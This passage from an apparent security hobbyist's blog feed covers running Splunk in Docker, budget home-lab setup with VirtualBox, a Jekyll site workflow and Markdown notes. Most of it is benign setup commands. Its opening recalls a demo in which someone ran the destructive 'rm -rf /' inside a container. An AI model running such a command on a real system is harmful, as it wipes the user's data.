an Ubuntu container, rm -rf /’ed themselves, created a new container, and it was like nothing ever happened. Amazing stuff.&lt;/p&gt;

&lt;p&gt;I won’t pretend I’m getting the most possible out of docker or even understand it fully, but the learning curve required to get a whole lot of functionality out of it is really shallow. I have Docker installed in a VM. Like I described earlier, I got it working well enough and then snapshotted it. If you’re not paying attention to what you’re doing, you can run into a lot of errors and annoyances you don’t see coming.&lt;/p&gt;

&lt;h2 id=&quot;some-use-cases-and-ideas&quot;&gt;Some Use Cases and Ideas&lt;/h2&gt;

&lt;p&gt;Docker is a really handy way to run things temporarily. There’s an excellent implementation of &lt;a href=&quot;https://github.com/citizen-stig/dockermutillidae&quot;&gt;Mutillidae&lt;/a&gt; that makes for a good test range, base Ubuntu Images, LAMP stacks, and on and on and on.&lt;/p&gt;

&lt;p&gt;One of my favorites is &lt;a href=&quot;https://www.splunk.com/&quot;&gt;Splunk&lt;/a&gt;. Sometimes, I’ll get a large amount of logs or data I need to go through quickly. If you’ve never used Splunk, it really is an amazing tool. It indexes data quickly and lets you run very complex searches. The problem is the full version is expensive and the free version has limits. There’s this happy in-between trial enterprise version. You can index a certain amount of data until it warns you, but it won’t stop you. You can ingest several gigabytes of data into a single splunk index, do what you need to do, and then get rid of it. If you’re snapshotting or pausing the container, you can get that data right back without reindexing it. If you forget, just spin up a new container and you’re ready to restart.&lt;/p&gt;

&lt;p&gt;Another test case I’m sure has never happened to any incident responder anywhere is that a server becomes ground zero for an incident but it wasn’t logging to a central logging server. Now you have gigabytes of data you need to go through quickly and no way to do it. Splunk can be really useful for situations like these (which probably never happen).&lt;/p&gt;

&lt;p&gt;There’s another really interesting project called &lt;a href=&quot;https://github.com/gchq/CyberChef.git&quot;&gt;CyberChef&lt;/a&gt;. Some nice fellow at GCHQ spent their free time building it. I’ll write a post on it later, but the short of it is you can take data, encrypt, decrypt, encode, decode, alter, arrange, whatever it until you have what you want. It’s really an amazing tool.&lt;/p&gt;

&lt;p&gt;This post will go into some examples of how to use Docker and cover some pitfalls I’ve run into.&lt;/p&gt;

&lt;h3 id=&quot;installation&quot;&gt;Installation&lt;/h3&gt;

&lt;p&gt;There are some pretty good guides to installing Docker out there. There’s the &lt;a href=&quot;https://docs.docker.com/engine/installation/linux/ubuntulinux/#/install-the-latest-version&quot;&gt;official documentation&lt;/a&gt; and &lt;a href=&quot;https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-ubuntu-16-04&quot;&gt;plenty&lt;/a&gt; of &lt;a href=&quot;https://www.howtoforge.com/tutorial/docker-installation-and-usage-on-ubuntu-16.04/&quot;&gt;others&lt;/a&gt;. This is the setup that worked for me in November 2016 and still works last I checked a week ago.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Install necessary packages&lt;/p&gt;

    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get install docker.io linux-image-extra-&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;uname &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt; linux-image-extra-virtual git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Add yourself to the appropriate group&lt;/p&gt;

    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;usermod &lt;span class=&quot;nt&quot;&gt;-aG&lt;/span&gt; docker &lt;span class=&quot;nv&quot;&gt;$USER&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Reboot to make sure everything sticks and force you to log back in so group permissions take&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Log back in and enable the service&lt;/p&gt;

    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systemctl start docker
systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;docker
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;splunk&quot;&gt;Splunk&lt;/h3&gt;

&lt;p&gt;Splunk is great Running it in a docker container is greater. I tend to run cheap with VMs and not provision huge drives or anything, so it’s important for me to run them lean. Since my VMs are small and disk space is at a premium, the default minimum free space setting splunk has before it stops indexing of 5GB is pretty greedy for my tastes. I changed up the Dockerfile on the &lt;a href=&quot;https://github.com/splunk/docker-splunk&quot;&gt;official Splunk repo&lt;/a&gt; to require a minimum of 500MB free in my &lt;a href=&quot;https://github.com/remotephone/docker-splunk&quot;&gt;forked version&lt;/a&gt;. I literally changed only one line, so you can just clone the original repo and edit it yourself or just fork mine. The change was on line 42 and 43 of docker-splunk/enterprise/Dockerfile.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;42 &amp;amp;&amp;amp; rm -rf /var/lib/apt/lists/* \
43 &amp;amp;&amp;amp; sed -i -e 's/minFreeSpace = 5000/minFreeSpace = 500/' /var/opt/splunk/etc/system/default/server.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Replacing the server.conf minFreeSpace variable means indexing will keep running until you have only 500mb free, which is easier to swing than 5GB. If you need to change it further, you can, but at that point its probably better just to make a bigger disk.&lt;/p&gt;

&lt;p&gt;For this example, I’ve created a /data directory and copied my VM’s /var/log/ directory into it just so we have some data to work with. To run the image, clone the repo, cd into the enterprise directory and do:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker build &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; splunkminfree &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&amp;lt;&lt;span class=&quot;nb&quot;&gt;let &lt;/span&gt;it run and build&amp;gt;
docker run &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SPLUNK_START_ARGS=--accept-license&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SPLUNK_USER=root&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;8000:8000&quot;&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /data:/root/ splunkminfree
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you watch the build happen, you can see where docker replaced the config file as it was building the image.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/splunksed.png&quot; alt=&quot;Splunk Sed Disk Size&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you did it right, you’ll have a container available at your VM IP on port 8000. It takes a minute or two to start up and you may have to enable port forwarding if your VM is NATed and not bridged. Once you update the default password, you’re at the start screen!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/splunkstart.png&quot; alt=&quot;Splunk Start Screen&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we check our settings page, we can see our sed we did in the Dockerfile took place before execution, so we don’t need to restart the Splunk service, it booted up with our changes in place. This is important because if you do your changes as part of the entrypoint.sh script or elsewhere that’s not in the Dockerfile, your container can start up services before changes are made, making you restart them to get where you wanted to be to begin with.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/splunksettings.png&quot; alt=&quot;Splunk Settings&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So now we have a working splunk instance, it loaded data at /data, and we can search it. You can change the destination mount directory to whatever you want, but since I sent it to the root user’s home folder, I need to find it  there.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/splunkdatadirs.png&quot; alt=&quot;Splunk Settings&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Indexing will take a little bit depending on how much data you have, but there it is! You can now do all the wonderful things you can usually do in Splunk.&lt;/p&gt;

&lt;p&gt;I think that’s all I want to go over for now. I’ll do a part 2 on this soon and go over Cyberchef.&lt;/p&gt;</content><author><name></name></author><summary type="html">Docker and containers are pretty nifty. You can run applications or even OSes inside containers (sort of, it shares a kernel with the host OS and there’s still at least some ways to escape a container to get to the host). The beauty of it to me is how throwaway it is. I saw a presentation where someone started an Ubuntu container, rm -rf /’ed themselves, created a new container, and it was like nothing ever happened. Amazing stuff.</summary></entry><entry><title type="html">Security Labs on a (no) budget</title><link href="http://localhost:4000/lab/homelab/budget/testing/2016/12/20/Lab_on_a_budget.html" rel="alternate" type="text/html" title="Security Labs on a (no) budget" /><published>2016-12-20T16:29:15-06:00</published><updated>2016-12-20T16:29:15-06:00</updated><id>http://localhost:4000/lab/homelab/budget/testing/2016/12/20/Lab_on_a_budget</id><content type="html" xml:base="http://localhost:4000/lab/homelab/budget/testing/2016/12/20/Lab_on_a_budget.html">&lt;h2 id=&quot;so-you-want-a-lab&quot;&gt;So you want a lab?&lt;/h2&gt;

&lt;p&gt;It’s going to cost money. You can’t do this for free. Luckily, you’ve probably spent most of it already. I do everything I need to do on my desktop which does triple duty as a workstation and gaming machine. You don’t need as much storage as I have, but it comes in handy.&lt;/p&gt;

&lt;p&gt;Here’s my desktop configuration:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;AMD FX-6350 - overclocked and Hyper212 Evo knockoff Cooler&lt;/li&gt;
  &lt;li&gt;16GB of ram&lt;/li&gt;
  &lt;li&gt;2 SSD’s - 120GB for Windows Install &amp;amp; 256 GB drive split 30GB for Linux install and 220GB for VM drives&lt;/li&gt;
  &lt;li&gt;2TB internal storage drive - Windows image backups, media, other stuff&lt;/li&gt;
  &lt;li&gt;750 GB drive - 500GB for games, 250 GB for random backups&lt;/li&gt;
  &lt;li&gt;AMD RX-480 8GB&lt;/li&gt;
  &lt;li&gt;External 2TB drive for backing up everything important&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The logic here is I have enough cores to run multiple VMs at once and enough storage to keep them all. Other processors are better and I’d upgrade if I needed to, but my processor does pretty well overclocked, I think I’m at 4.5ghz.&lt;/p&gt;

&lt;p&gt;I use multiple drives because I’m always tinkering with and reinstalling OSes. Windows gets the full 120GB because it tends to be space hungrier and that’s where I keep in progress work, the 220GB partition on the other SSD just houses VMs. You could probably get away with 1 single SSD at 500gb, 100gb for windows, 30gb for linux, and the rest for data and VMs. I really like the 250GB of random backup space, I keep installation files of all the applications I use in there and just reinstall without having to download them all over again every time I nuke the install.&lt;/p&gt;

&lt;p&gt;I also have two monitors. I don’t know how people got along before dual monitor setups, but it makes a world of difference. I can full screen a VM on one window, have notes anda  webbrowser open on the other monitor, and not have to pop out of full screen all the time. If I’m doing something between VMs and don’t really need the desktop real estate on the VM, I can keep multiple VM desktops open next to each other to work on. Once you have it, you’ll never want to let it go.&lt;/p&gt;

&lt;h3 id=&quot;virtualization&quot;&gt;Virtualization&lt;/h3&gt;

&lt;p&gt;I’m not a fancy man, so I don’t pay for things if I can avoid it. I highly recommend Virtualbox for most of your virtualization. There’s some machines I’ve gotten (for the OSCP for example) that require VMWare Player, but the free copy does well enough for those 1 offs. Virtualbox supports snapshotting for free which makes a world of difference if you need to turn your computer off or want to quickly wipe a workstation to defaults.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/vboxconsole.png&quot; alt=&quot;VBox Console&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;oses-and-where-to-get-them&quot;&gt;OSes and where to get them&lt;/h3&gt;

&lt;p&gt;Glad you asked. The linux ones are easy enough to find, go to distro watch or go to a download repository and just navigate backwards through the directories till you find old versions. There’s also handy things like the &lt;a href=&quot;http://vault.centos.org/&quot;&gt;Centos Vaults&lt;/a&gt; where you can get any old version you want. These come in handy if you’re testing specific exploits or versions of something.&lt;/p&gt;

&lt;p&gt;Windows is trickier, but there’s some real nuggets of gold out there. Microsoft has TechNet where you can download some versions of Windows Server through their &lt;a href=&quot;https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2012-r2&quot;&gt;Evaluation Center&lt;/a&gt; assuming you’re using their license appropriately. Make sure you read and follow their rules, I can’t tell you if you’re ok to download them or not, but they are available.&lt;/p&gt;

&lt;p&gt;More interestingly, for consumer OSes from Windows 7 - 10, you can download VHD files that run neatly in Virtualbox. They are free to try and likely expire sometime. They used to offer Windows XP images, but those no longer work. Check em out &lt;a href=&quot;https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;save-your-work&quot;&gt;Save your work&lt;/h3&gt;

&lt;p&gt;I can’t emphasize how much good stuff I lost because I didn’t save it. My recommended approach to your VMs is to build them and then create a snapshot before you break anything serious. If you’re going to install a bunch of applications or test an exploit, make sure you save your work.&lt;/p&gt;

&lt;p&gt;There’s a lot of guides and how-to’s out there that I’ve run into that work only part way and then I’m forced to back up a few steps and do something differently or maybe I need to install a certain version of something or the distro package doesn’t work and I need to install from source or whatever, but you’re going to run into problems and you need to have a state where you can revert back to and not lose everything.&lt;/p&gt;

&lt;h3 id=&quot;take-notes&quot;&gt;Take Notes&lt;/h3&gt;

&lt;p&gt;I take notes of a lot of what I do. I keep OneNote documents for all sorts of stuff, and they’re great, but they’re limited in how I can share them. With the new versions of Office, everything has to go into OneDrive and that’s just lame and the new interface sucks and just no.&lt;/p&gt;

&lt;p&gt;I use notedpad ++ a lot. This is a screenshot of me figuring out some Jekyll stuff. It’s real jot it down as I go kinda stuff, but it works. I want to write another article about notepad++ and other tools because I really think it’s one of the most useful things out there.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/notepadnotes.png&quot; alt=&quot;notepadnotes&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It might look like scratch, but this is what I go back to when I redocument what I’m doing later.&lt;/p&gt;

&lt;h3 id=&quot;some-thoughts-and-links&quot;&gt;Some thoughts and links&lt;/h3&gt;

&lt;p&gt;Write stuff down. Have enough saves so you can throw it away and be back to a fresh start quickly. Don’t spend all your money to do this. These are some links to get some great stuff.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.virtualbox.org/wiki/Downloads&quot;&gt;Virtualbox&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.vmware.com/products/player/playerpro-evaluation.html&quot;&gt;VMWare Player&lt;/a&gt; - The free one&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2012-r2&quot;&gt;Microsoft Technet Evaluation Center&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/&quot;&gt;Windows IE VMs for Developers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://pcpartpicker.com/&quot;&gt;PC Part Picker&lt;/a&gt; In case you need stuff&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><summary type="html">So you want a lab?</summary></entry><entry><title type="html">Maintaining a Productive Workflow</title><link href="http://localhost:4000/how-to/workflow/2016/12/19/Workflow.html" rel="alternate" type="text/html" title="Maintaining a Productive Workflow" /><published>2016-12-19T17:05:15-06:00</published><updated>2016-12-19T17:05:15-06:00</updated><id>http://localhost:4000/how-to/workflow/2016/12/19/Workflow</id><content type="html" xml:base="http://localhost:4000/how-to/workflow/2016/12/19/Workflow.html">&lt;p&gt;I work much better with a simple standardized work flow. If you followed my post on Installing Jekyll and getting ready, you’re ready to just use my workflow if you like it. Otherwise, tweak where necessary.&lt;/p&gt;

&lt;p&gt;This workflow assumes you have a local (ubuntu maybe\?) environment for development, use vim to edit text, git on the command line to push most updates, occassionally change things on the github console, have an SSH key set up to authenticate you, and don’t mind being methodical about it.&lt;/p&gt;

&lt;h3 id=&quot;in-a-nutshell&quot;&gt;In a nutshell..&lt;/h3&gt;

&lt;p&gt;I found it easier to work with Chrome and 2 tabs open, one for the repository itself and one for the page to refresh and watch changes live. I use a bash console to make my changes on the site, commit and push them to the master branch (because I haven’t figured out forks yet) and occassionally run a local jekyll server to do tests that I think might break my site. Otherwise, I’m pretty fast and loose and commit half pages occassionally (as you may be able to tell…) and it really doesn’t matter as long as you come back and clean it up in a reasonable amount of time.&lt;/p&gt;

&lt;p&gt;These items were important in order to have an easy workflow&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Make sure wherever you develop matches production
    &lt;ul&gt;
      &lt;li&gt;Don’t use unsupported themes in development, for example&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;Don’t make changes in the web console without pulling them back locally&lt;/p&gt;

        &lt;ul&gt;
          &lt;li&gt;git pull&lt;/li&gt;
          &lt;li&gt;git submodule update&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Don’t make multiple huge changes at once. I feel pretty comfortable creating a full post page one at a time. I don’t feel comfortable changing my default.html layout without first testing it and changing one part at a time. It’s much harder to work backwards and troubleshoot if you’ve done a few different things and you can’t remember them all.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Pick a style you like and stick with it, at least until you have some content. Once you have a decent amount of content, you can be aware of how changes you make affect all your content.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;With that, it’s time to work. I do the following things&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Always keep my github.io page and my localhost page ready. You can quickly review changes and make sure you pushed them right this way.&lt;/li&gt;
  &lt;li&gt;It’s easier for me to work from my root directory and tree around and edit files directories deep than to get into a directory and find out I didn’t back out before creating a new page.&lt;/li&gt;
  &lt;li&gt;Refresh and test frequently. If I’m testing formatting, I often rebuild several times very quickly and refresh my localhost page to see them happen in action.&lt;/li&gt;
  &lt;li&gt;Stand on the shoulders of giants. Copy that template, reuse that syntax, google that stackoverflow. Other people have solved these problems, so use their knowledge. Just pay attention to when a fix you want to apply breaks something you’re doing or follows a pattern you don’t use.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I work with a dual monitor set up both at home and at work. I don’t know how people get along with single monitors unless they’re ultrawide. Invest in a second monitor, it’s worth it.&lt;/p&gt;</content><author><name></name></author><summary type="html">I work much better with a simple standardized work flow. If you followed my post on Installing Jekyll and getting ready, you’re ready to just use my workflow if you like it. Otherwise, tweak where necessary.</summary></entry><entry><title type="html">Installing Jekyll for Security Professionals - or “I don’t know what I’m doing”</title><link href="http://localhost:4000/2016/12/19/Installing_Jekyll_For_Security_Admins.html" rel="alternate" type="text/html" title="Installing Jekyll for Security Professionals - or &quot;I don't know what I'm doing&quot;" /><published>2016-12-19T17:05:15-06:00</published><updated>2016-12-19T17:05:15-06:00</updated><id>http://localhost:4000/2016/12/19/Installing_Jekyll_For_Security_Admins</id><content type="html" xml:base="http://localhost:4000/2016/12/19/Installing_Jekyll_For_Security_Admins.html">&lt;h2 id=&quot;why-are-we-here-anyway&quot;&gt;Why are we here anyway?&lt;/h2&gt;

&lt;p&gt;Jekyll lets you create static pages easily. I’m a security person, not a website admin and I really didn’t want to spend the time learn while also generating content for the site. Maybe one day I’ll move this to something more formal, but this really seems to do well enough for now.&lt;/p&gt;

&lt;p&gt;One advantage of this style is learning how to interact with github. Even simple pulls and commits are things I never really had to do, so its nice to least know what’s happening when trying to speak to DevOps teams.&lt;/p&gt;

&lt;p&gt;The most obvious advantage is security. Lots of the WYSIWYG CMS’s get interesting once you add plugins and that’s when you add vulnerabilities. Static pages are just that, static pages. You can get “dynamic” enough with the features i Jekyll and that’s good enough for me. Besides, how embarrassing would it be to have my security notes webpage spamming people because it was compromised?&lt;/p&gt;

&lt;h2 id=&quot;why-jekyll&quot;&gt;Why Jekyll?&lt;/h2&gt;

&lt;p&gt;I found Jekyll to be pretty well documented with plenty of templates and site examples to copy and choose from. &lt;a href=&quot;https://www.smashingmagazine.com/2014/08/build-blog-jekyll-github-pages/&quot;&gt;This&lt;/a&gt; site was the first guide I followed, but you take pretty much their entire site layout and then I found it difficult to add and change things without breaking the template (this may be entirely my fault).&lt;/p&gt;

&lt;p&gt;I’m pretty comfortable on the command line, so next I tired Github’s documentation &lt;a href=&quot;https://help.github.com/articles/using-jekyll-as-a-static-site-generator-with-github-pages/&quot;&gt;here.&lt;/a&gt; That worked a lot better, but the layout was super basic.&lt;/p&gt;

&lt;p&gt;Ultimately I mashed a few different templates and guides together. This is risky if you’re committing large changes together all at once, so I have been making changes slowly one at a time. This approach is much easier when you’re just figuring this out and you’re trying to learn github and jekyll and markdown at the same time.&lt;/p&gt;

&lt;h2 id=&quot;getting-started---locally-and-remotely&quot;&gt;Getting Started - locally and remotely&lt;/h2&gt;

&lt;p&gt;There are a few things you need to do. I don’t do this stuff on my desktop, I use a VM (even working in an Ubuntu variant), clone the repository there, do my work, and then throw away the VM or restore a snapshot. It means I have to manually add SSH keys to my github account each time depending on where I’m working from, but you can make this easy with the following:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{&quot;title&quot;:&quot;KEYNAME&quot;,&quot;key&quot;:&quot;ssh-rsa AAA...&quot;}'&lt;/span&gt; https://api.github.com/user/keys 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Since I’m in the web console anyway, it’s easy to delete unneeded keys. You’ll also have to edit your ssh config file but you can avoid all that work if you just do it from your desktop. I’d rather not for reasons I’m still working out.&lt;/p&gt;

&lt;p&gt;If you’re working out of a new VM or environment, you’ll need to repeat steps 1, 2, and 3 each time. Once your site is initially set up, you should be able to just install the environment, clone your repo, build it, make changes, test, commit them, and then throw it all away. Fun, no?&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Install and prep your environment.&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;Create a new repository manually using the &lt;a href=&quot;https://help.github.com/articles/using-je
kyll-as-a-static-site-generator-with-github-pages/&quot;&gt;github documentation&lt;/a&gt; if this is your first time creating one.&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;I used ubuntu 16.04. You can use whatever you want, but you’re on your own.&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;Run the following:&lt;/p&gt;

        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get install ruby ruby-dev make gcc git
&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;gem install bundle
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;I also turn on a color scheme in VIM (shine until it fails me) and enable spellchecking. Add this to your ~/.vimrc file&lt;/p&gt;

        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;spell &lt;span class=&quot;nv&quot;&gt;spelllang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;en_us
 colorscheme shine
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;I keep a directory of repositories in my home directory to minimize clutter called gits and do all my work out of there&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Create your repository through the web console and clone it locally or create it locally and push it out.&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;I tried doing it manually and this was just easier.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Make sure you SSH keys are set up to allow you to push commits quickly. I have a crazy password and its a pain to type it and my username all the time instead of just unlocking my ssh key.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Find the sites you want to copy pages to template from, cd into the directory you’ll use them and wget the raw github file instead of trying to copy and paste it into vim.&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;Be nice and credit them - See my About page for the people I owe for this&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Build a single post and make sure you have the basics you want in there. This includes the header at the top that outlines the formatting.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Commit your changes and make a local backup! I’ve wiped out this repository half a dozen times because I made a change I didn’t remember or understand. Once you have something basic that works, BACK IT UP.&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;You can unzip your backup, delete the repo, and repush it back out to github instead of messing with any other silliness. If youre like me and don’t know what you’re doing, you will mess it up. Save yourself some trouble.&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;I learned github let’s you restore to an older version, but I can’t find a way to go from a restored older version to a newer one. If bad comes to worse or you completely change themes, at least you can always just dump your posts folder into your new repository and bam, you’re back&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;Before you commit, you need to run&lt;/p&gt;

        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git config &lt;span class=&quot;nt&quot;&gt;--global&lt;/span&gt; user.email &lt;span class=&quot;s2&quot;&gt;&quot;you@example.com&quot;&lt;/span&gt;
 	  git config &lt;span class=&quot;nt&quot;&gt;--global&lt;/span&gt; user.name &lt;span class=&quot;s2&quot;&gt;&quot;Your Name&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;If you want to test it locally, you need to make a Gemfile according to the instructions &lt;a href=&quot;https://help.github.com/articles/using-jekyll-as-a-static-site-generator-with-github-pages/&quot;&gt;here&lt;/a&gt;. Then, from the root of your repo:&lt;/p&gt;

    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bundle install
bundle &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;jekyll serve &lt;span class=&quot;nt&quot;&gt;--host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.0.0.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Using that host=0.0.0.0 means you can do this from a VM and still have it accessible from your host OS, assuming NATing or bridging or whatever you’re doing is in order.&lt;/p&gt;

&lt;p&gt;That’s really all I got so far. Build something very basic that works, back it up, know how to rebuild it quickly, and you’ll handle half the trouble you will inevitably run into very quickly.&lt;/p&gt;</content><author><name></name></author><summary type="html">Why are we here anyway?</summary></entry><entry><title type="html">What is Markdown anyway?</title><link href="http://localhost:4000/quick-reference/into/whatamidoing/2016/12/18/what-is-markdown.html" rel="alternate" type="text/html" title="What is Markdown anyway?" /><published>2016-12-18T21:14:55-06:00</published><updated>2016-12-18T21:14:55-06:00</updated><id>http://localhost:4000/quick-reference/into/whatamidoing/2016/12/18/what-is-markdown</id><content type="html" xml:base="http://localhost:4000/quick-reference/into/whatamidoing/2016/12/18/what-is-markdown.html">&lt;p&gt;I don’t know markdown syntax but it seems easy enough. This page is intended to be a quick reference for the 5-10 things I will no doubt do over and over and over.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://kramdown.gettalong.org/quickref.html&quot;&gt;This page&lt;/a&gt; seems pretty interesting, it has a lot of the syntax I’ll be using.&lt;/p&gt;

&lt;p&gt;This is the format for my post titles. Markup will usually be md for markdown, but maybe I’ll get fancy one day.&lt;/p&gt;

